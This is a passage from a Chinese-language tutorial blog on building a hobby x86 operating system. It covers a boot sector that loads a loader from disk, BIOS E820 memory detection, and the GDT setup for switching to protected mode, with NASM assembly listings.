class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">mov si, booting</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">mov edi, 0x1000  ; 读到的目标内存</span><br><span class="line">mov ecx, 2       ; 起始扇区</span><br><span class="line">mov bl,4         ;扇区数量</span><br><span class="line">call read_disk</span><br><span class="line"></span><br><span class="line">cmp word [0x1000], 0x55aa</span><br><span class="line">jnz error</span><br><span class="line"></span><br><span class="line">jmp 0:0x1002</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">;读取硬盘</span><br><span class="line">read_disk:</span><br><span class="line">    ;设置读写扇区数量</span><br><span class="line">    ;0x1f2端口=1</span><br><span class="line">    mov dx, 0x1f2</span><br><span class="line">    mov al, bl</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;-----------------------------------------</span><br><span class="line">    ;0x1f3端口= 00000000</span><br><span class="line">    inc dx; 0x1f3</span><br><span class="line">    mov al, cl ;起始扇区的前8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f4端口= 00000000</span><br><span class="line">    inc dx; 0x1f4</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的中8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f5端口= 00000000</span><br><span class="line">    inc dx; 0x1f5</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的高8位</span><br><span class="line">    out dx, al</span><br><span class="line">    ;起始扇区24位：00000000_00000000_00000000</span><br><span class="line">    ;-----------------------------------------</span><br><span class="line"></span><br><span class="line">    inc dx;0x1f6</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    and cl, 0b1111;高4位置0</span><br><span class="line">    mov al, 0b1110_0000;</span><br><span class="line">    or al, cl; cl拼接到al后面</span><br><span class="line"></span><br><span class="line">    out dx, al;主盘 LBA模式设置</span><br><span class="line"></span><br><span class="line">    ;0x1f7端口= 0x20;表示读硬盘</span><br><span class="line">    inc dx;0x1f7</span><br><span class="line">    mov al,0x20;读硬盘</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx;清空exc</span><br><span class="line">    mov cl, bl;得到读写扇区的数量</span><br><span class="line"></span><br><span class="line">    .read:</span><br><span class="line">        push cx;保存cx</span><br><span class="line">        call .waits;等待数据准备完毕</span><br><span class="line">        call .reads;读取一个扇区</span><br><span class="line">        pop cx</span><br><span class="line">        loop .read</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    .waits:</span><br><span class="line">        mov dx, 0x1f7</span><br><span class="line">        .check:</span><br><span class="line">            in al, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2; </span><br><span class="line">            and al, 0b1000_1000; 与操作，只剩下3,7位</span><br><span class="line">            cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪</span><br><span class="line">            jnz .check</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    .reads:</span><br><span class="line">        mov dx, 0x1f0</span><br><span class="line">        mov cx, 256;一个扇区是256字</span><br><span class="line">        .readw:</span><br><span class="line">            in ax, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2;</span><br><span class="line">            mov [edi], ax</span><br><span class="line">            add edi, 2</span><br><span class="line">            loop .readw</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">;写硬盘</span><br><span class="line">write_disk:</span><br><span class="line">    ;设置读写扇区数量</span><br><span class="line">    ;0x1f2端口=1</span><br><span class="line">    mov dx, 0x1f2</span><br><span class="line">    mov al, bl</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;-----------------------------------------</span><br><span class="line">    ;0x1f3端口= 00000000</span><br><span class="line">    inc dx; 0x1f3</span><br><span class="line">    mov al, cl ;起始扇区的前8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f4端口= 00000000</span><br><span class="line">    inc dx; 0x1f4</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的中8位</span><br><span class="line">    out dx, al</span><br><span class="line"></span><br><span class="line">    ;0x1f5端口= 00000000</span><br><span class="line">    inc dx; 0x1f5</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    mov al, cl ;起始扇区的高8位</span><br><span class="line">    out dx, al</span><br><span class="line">    ;起始扇区24位：00000000_00000000_00000000</span><br><span class="line">    ;-----------------------------------------</span><br><span class="line"></span><br><span class="line">    inc dx;0x1f6</span><br><span class="line">    shr ecx, 8</span><br><span class="line">    and cl, 0b1111;高4位置0</span><br><span class="line">    mov al, 0b1110_0000;</span><br><span class="line">    or al, cl; cl拼接到al后面</span><br><span class="line"></span><br><span class="line">    out dx, al;主盘 LBA模式设置</span><br><span class="line"></span><br><span class="line">    ;0x1f7端口= 0x20;表示读硬盘</span><br><span class="line">    inc dx;0x1f7</span><br><span class="line">    mov al,0x30;读硬盘</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    xor ecx, ecx;清空exc</span><br><span class="line">    mov cl, bl;得到读写扇区的数量</span><br><span class="line"></span><br><span class="line">    .write:</span><br><span class="line">        push cx;保存cx</span><br><span class="line">        call .writes;写一个扇区</span><br><span class="line">        call .waits;等待繁忙</span><br><span class="line">        pop cx</span><br><span class="line">        loop .write</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    .waits:</span><br><span class="line">        mov dx, 0x1f7</span><br><span class="line">        .check:</span><br><span class="line">            in al, dx</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2; </span><br><span class="line">            and al, 0b1000_0000; 与操作，只剩下7位</span><br><span class="line">            cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪</span><br><span class="line">            jnz .check</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    .writes:</span><br><span class="line">        mov dx, 0x1f0</span><br><span class="line">        mov cx, 256;一个扇区是256字</span><br><span class="line">        .writew:</span><br><span class="line">            mov ax, [edi]</span><br><span class="line">            out dx, ax</span><br><span class="line">            jmp $+2; nop等价，直接跳下一行</span><br><span class="line">            jmp $+2; 制造一点点延迟</span><br><span class="line">            jmp $+2;</span><br><span class="line">            add edi, 2</span><br><span class="line">            loop .writew</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;实模式的打印</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">    .next:</span><br><span class="line">        mov al, [si];字符</span><br><span class="line">        cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">        jz .done;结尾跳转至ret</span><br><span class="line">        int 0x10;功能调用</span><br><span class="line">        inc si;地址-1</span><br><span class="line">        jmp .next;继续，下一个</span><br><span class="line">    .done:</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">booting:</span><br><span class="line">    db &quot;Booting Xsys...&quot;,10,13,0; \n\r</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">    mov si, .msg</span><br><span class="line">    call print</span><br><span class="line">    hlt; CPU停止</span><br><span class="line">    jmp $</span><br><span class="line">    .msg db &quot;Kernel Booting Failed&quot;,10,13,0</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/301dc98f226a6cb1d49f0ed54cd5dba3.png" alt="image-20220218213058186" /></p><p>同时可以修改loader.asm的校验位，查看报错是否正常</p><p><img src="https://img.joe1sn.top/uploads/big/8a89e6f7130cb0a103edb4d53f30cbc9.png" alt="image-20220218213351940" /></p><p><strong>更改loader.bin的时候要重新make master.img让新的loader.bin写入磁盘文件</strong></p><h1 id="操作系统实现-内存检测"><a class="markdownIt-Anchor" href="#操作系统实现-内存检测"></a> 操作系统实现-内存检测</h1><p>实模式下在进入保护模式之前要检测内存是否能够被使用，并且更好的规划内存空间。</p><h2 id="如何实现内存检测"><a class="markdownIt-Anchor" href="#如何实现内存检测"></a> 如何实现内存检测</h2><p>BIOS的<strong>int 0x15</strong>调用、<strong>0xe820</strong>子功能号、<strong>20B</strong>的<code>ards</code>(Address Range Descriptor Structure)结构体大小</p><p>BIOS会返回一个ards结构体到指定的<code>ards_buffer</code>中，结构体内容如图</p><p><img src="https://img.joe1sn.top/uploads/big/1e3c39da90e482a8609177238e0eb9d6.jpeg" alt="" /></p><p>其中的<strong>Type</strong>字段是用来描述这段内存的类型，这里所谓的类型是说明这段内存的用途，是可以被操作系统使用，还是保留起来不能用</p><table><thead><tr><th>Type值</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>AddressRangeMemory</td><td>该内存可以被操作系统使用</td></tr><tr><td>2</td><td>AddressRangeReserved</td><td>内存使用中，或被系统保留，操作系统不能使用</td></tr><tr><td>其他</td><td>undefine</td><td>未定义</td></tr></tbody></table><h2 id="源代码实现"><a class="markdownIt-Anchor" href="#源代码实现"></a> 源代码实现</h2><ol><li><p>在boot中添加loader失败语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">error:</span><br><span class="line">    mov si, .msg</span><br><span class="line">    call print</span><br><span class="line">    hlt; CPU停止</span><br><span class="line">    jmp $</span><br><span class="line">    .msg db &quot;Kernel Booting Failed&quot;,10,13,0</span><br></pre></td></tr></table></figure></li><li><p>在loader最后结尾定义ards_count与ards_buffer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ards_count:</span><br><span class="line">    dw 0</span><br><span class="line">ards_buffer:</span><br></pre></td></tr></table></figure></li><li><p>在loader中编写内存启动程序</p><p>具体调用情况如下</p><p><img src="https://img.joe1sn.top/uploads/big/e89dce1db6034a2e761d39a0a2872f12.jpeg" alt="" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">detect_mem:</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    </span><br><span class="line">    mov ax, 0</span><br><span class="line">    mov es, ax;es:di结构体缓存位置</span><br><span class="line">    mov edi, ards_buffer;结构体内存位置</span><br><span class="line"></span><br><span class="line">    mov edx, 0x534d4150;SMAP签名</span><br><span class="line"></span><br><span class="line">.next:</span><br><span class="line">    mov eax, 0xe820 ;子功能号</span><br><span class="line">    mov ecx, 20     ;ards结构体大小，单位：字节</span><br><span class="line">    int 0x15        ;调用0x15内存检测功能</span><br><span class="line">    </span><br><span class="line">    ;若CF=1，则表示出错</span><br><span class="line">    jc error</span><br><span class="line"></span><br><span class="line">    ;否则将缓存指针指向下一个结构体</span><br><span class="line">    add di, cx</span><br><span class="line"></span><br><span class="line">    inc word [ards_count]   ;将结构体数量+1</span><br><span class="line"></span><br><span class="line">    cmp ebx, 0              ;0为检测结束</span><br><span class="line">    jnz .next</span><br><span class="line"></span><br><span class="line">    mov si, detecting</span><br><span class="line">    call print</span><br><span class="line"></span><br><span class="line">;     mov cx, [ards_buffer]   ;结构体数量</span><br><span class="line">;     mov si, 0               ;结构体指针</span><br><span class="line">; .show:</span><br><span class="line">;     mov eax, [si + ards_buffer]</span><br><span class="line">;     mov ebx, [8 + si + ards_buffer]</span><br><span class="line">;     mov edx, [16 + si + ards_buffer]</span><br><span class="line">;     add si,20</span><br><span class="line">;     xchg bx,bx</span><br><span class="line">;     loop .show              ;loop是根据cx的值循环</span><br><span class="line"></span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure></li><li><p>写loader报错和内存检测完成功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">detecting:</span><br><span class="line">    db &quot;Detecting Memeory Success...&quot;,10,13,0    </span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">    mov si, .msg</span><br><span class="line">    call print</span><br><span class="line">    hlt; CPU停止</span><br><span class="line">    jmp $</span><br><span class="line">    .msg db &quot;Kernel Booting Error&quot;,10,13,0</span><br></pre></td></tr></table></figure></li></ol><p>激活<code>.show</code>那段被注释的代码可以在bochs调试看到每次调用返回地ARDS结构体内容</p><p><img src="https://img.joe1sn.top/uploads/big/3c738ea3f4f6d21757febaf5ed7697c2.png" alt="image-20220219170508060" /></p><p><img src="https://img.joe1sn.top/uploads/big/4f7b1e6f59de2f6602c6bbabbbc29050.png" alt="image-20220219170530368" /></p><p><img src="https://img.joe1sn.top/uploads/big/0fb8a372531d9aa18799c0b31ed0a292.png" alt="image-20220219170552534" /></p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><p><a href="https://wiki.osdev.org/Detecting_Memory_(x86)#E820h">x86的E820h子功能</a></p><p><a href="https://blog.csdn.net/sinolover/article/details/93886204">一步步编写操作系统 33 利用bios中断0x15子功能0xe820获取内存</a></p><h1 id="操作系统实现-保护模式与全局描述符"><a class="markdownIt-Anchor" href="#操作系统实现-保护模式与全局描述符"></a> 操作系统实现-保护模式与全局描述符</h1><p>8086 1M 内存，实模式，可以完全控制计算机</p><p>80286 保护模式 16位</p><h2 id="保护模式"><a class="markdownIt-Anchor" href="#保护模式"></a> 保护模式</h2><ul><li>IT</li><li>寄存器 Register / 有些寄存器只能操作系统使用</li><li>高速缓存 Cache</li><li>内存 / 描述符</li><li>外部设备 / 硬盘 int/out</li></ul><h2 id="全局描述符"><a class="markdownIt-Anchor" href="#全局描述符"></a> 全局描述符</h2><p><strong>80386 描述符</strong></p><p><img src="https://img.joe1sn.top/uploads/big/cf935ed6d3a5ee349c8c72d2806e3e7b.jpg" alt="" /></p><h2 id="全局描述符表-gdt"><a class="markdownIt-Anchor" href="#全局描述符表-gdt"></a> 全局描述符表 GDT</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">descriptor gdt[<span class="number">8192</span>];</span><br></pre></td></tr></table></figure><ul><li>0 必须全为 0-null 描述符</li><li>8191 通用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lgdt [gdt_ptr]; <span class="comment">//load gdt</span></span><br><span class="line">sgdt [gdt_ptr]; <span class="comment">// save gdt</span></span><br></pre></td></tr></table></figure><h2 id="段选择子"><a class="markdownIt-Anchor" href="#段选择子"></a> 段选择子</h2><ul><li>只需要一个代码段</li><li>需要一个或多个段</li><li>加载到段寄存器中 / 校验特权等级</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">selector</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> RPL :<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> TI :<span class="number">1</span>;<span class="comment">//local descriptor table</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> index :<span class="number">13</span>;</span><br><span class="line">&#125; __attribute__((packed)) selector;</span><br></pre></td></tr></table></figure><ul><li>cs / ds / es /gs</li><li>fs / gs</li></ul><h2 id="a20线"><a class="markdownIt-Anchor" href="#a20线"></a> A20线</h2><p>参考第一篇文章，来源于8086最开始只有20条地址线</p><p>打开是修改0x92端口</p><h2 id="pe-protect-enable"><a class="markdownIt-Anchor" href="#pe-protect-enable"></a> PE Protect Enable</h2><p>cr0寄存器 0 位 置 1</p><h2 id="loaderasm"><a class="markdownIt-Anchor" href="#loaderasm"></a> loader.asm</h2><ol><li><p>准备工作，定义一些常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">code_selector equ (1&lt;&lt;3);代码段选择子</span><br><span class="line">data_selector equ (2&lt;&lt;3);数据段选择子</span><br><span class="line">memeory_base equ 0;内存起始地址 基地址</span><br><span class="line">memeory_limit (1024 * 1024 * 1024 *4) / (1024*4) - 1; 内存界限 4G/4K -1</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;gdt[2]</span><br><span class="line">gdt_ptr:</span><br><span class="line">    dw (gdt_end-gdt_base)-1</span><br><span class="line">    dd gdt_base</span><br><span class="line">gdt_base:</span><br><span class="line">    dd 0,0  ;null描述符</span><br><span class="line">gdt_code:</span><br><span class="line">    dw memeory_limit &amp; 0xffff   ; 段界限 0-15</span><br><span class="line">    dw memeory_base &amp; 0xffff    ; 基地址 0-16</span><br><span class="line">    db memeory_base&gt;&gt;16 &amp; 0xff  ; 基地址 0-16</span><br><span class="line">    db 0b_1_00_1_1_0_1_0        ; 存在-dlp_0-S_代码-非依从-可读-没有被访问过</span><br><span class="line">    ; 4k-32位-不是64位-avaliable_0-段界限16~19</span><br><span class="line">    db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf</span><br><span class="line">    db (memeory_base &gt;&gt; 24) &amp; 0xff</span><br><span class="line">gdt_data:</span><br><span class="line">    dw memeory_limit &amp; 0xffff   ; 段界限 0-15</span><br><span class="line">    dw memeory_base &amp; 0xffff    ; 基地址 0-16</span><br><span class="line">    db memeory_base&gt;&gt;16 &amp; 0xff  ; 基地址 0-16</span><br><span class="line">    ; 存在-dlp_0-S_数据-非依从向上-可读-没有被访问过</span><br><span class="line">    db 0b_1_00_1_0_0_1_0</span><br><span class="line">    ; 4k-32位-不是64位-avaliable_0-段界限16~19</span><br><span class="line">    db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf</span><br><span class="line">    db (memeory_base &gt;&gt; 24) &amp; 0xff    </span><br><span class="line">gdt_end:</span><br></pre></td></tr></table></figure></li><li><p>准备保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">prepare_protected_mode:</span><br><span class="line">    xchg bx,bx</span><br><span class="line">    cli;关闭中断</span><br><span class="line"></span><br><span class="line">    ; 打开A20线</span><br><span class="line">    in al, 0x92</span><br><span class="line">    or al, 0b10</span><br><span class="line">    out 0x92, al</span><br><span class="line"></span><br><span class="line">    ;加载GDT</span><br><span class="line">    lgdt [gdt_ptr]</span><br><span class="line"></span><br><span class="line">    ;启动保护模式</span><br><span class="line">    mov eax, cr0</span><br><span class="line">    or eax, 1</span><br><span class="line">    mov cr0, eax</span><br><span class="line"></span><br><span class="line">    ;用跳转刷新缓存，启用保护模式</span><br><span class="line">    jmp dword code_selector:protected_mode</span><br></pre></td></tr></table></figure></li><li><p>进入保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected_mode:</span><br><span class="line">    xchg bx, bx</span><br><span class="line">    mov ax, data_selector</span><br><span class="line">    ;初始化段寄存器</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line"></span><br><span class="line">    mov esp, 0x10000; 栈顶</span><br><span class="line">    mov byte [0xb8000], &#x27;P&#x27;</span><br><span class="line">    mov byte [0x200000], &#x27;P&#x27;</span><br><span class="line"></span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure></li></ol><h2 id="参考-2"><a class="markdownIt-Anchor" href="#参考-2"></a> 参考</h2><p><a href="https://www.bilibili.com/video/BV1bT4y1k7EQ">https://www.bilibili.com/video/BV1bT4y1k7EQ</a></p><p><a href="https://www.cnblogs.com/iBinary/p/8253735.html">内核第二讲,内存保护的实现,以及知识简介,局部描述符,全局描述符.</a></p><h1 id="操作系统实现-进入内核"><a class="markdownIt-Anchor" href="#操作系统实现-进入内核"></a> 操作系统实现-进入内核</h1><p>在上一篇文章中我们实现了进入保护模式，那么下一步就是进入操作系统内核</p><p>这个时候我们就可以直接给寄存器赋值，能使用更大的内存地址空间</p><h2 id="文件整理"><a class="markdownIt-Anchor" href="#文件整理"></a> 文件整理</h2><p>首先对整个文件夹目录结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">joe1sn@ubuntu:~/Desktop/os2$ tree</span><br><span class="line">.</span><br><span class="line">├── build</span><br><span class="line">│   ├── boot</span><br><span class="line">│   │   ├── boot.bin</span><br><span class="line">│   │   └── loader.bin</span><br><span class="line">│   ├── kernel</span><br><span class="line">│   │   └── start.o</span><br><span class="line">│   ├── kernel.bin</span><br><span class="line">│   ├── master.img</span><br><span class="line">│   ├── system.bin</span><br><span class="line">│   └── system.map</span><br><span class="line">└── src</span><br><span class="line">    ├── bochsrc</span><br><span class="line">    ├── boot</span><br><span class="line">    │   ├── boot.asm</span><br><span class="line">    │   └── loader.asm</span><br><span class="line">    ├── build</span><br><span class="line">    ├── kernel</span><br><span class="line">    │   └── start.asm</span><br><span class="line">    └── makefile</span><br></pre></td></tr></table></figure><ul><li><p><strong>build</strong></p><p>所有最终生成的文件都会放在这里</p><ul><li>boot：MBR以及boot相关二进制文件</li><li>kernel：操作系统启动的相关二进制文件</li></ul></li><li><p><strong>src</strong></p><p>源代码</p><ul><li>bochsrc：bochs配置文件</li><li>boot：MBR以及boot相关源代码</li><li>kenel：操作系统源代码</li><li>makefile：项目编译文件</li></ul></li></ul><p>对应修改的makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 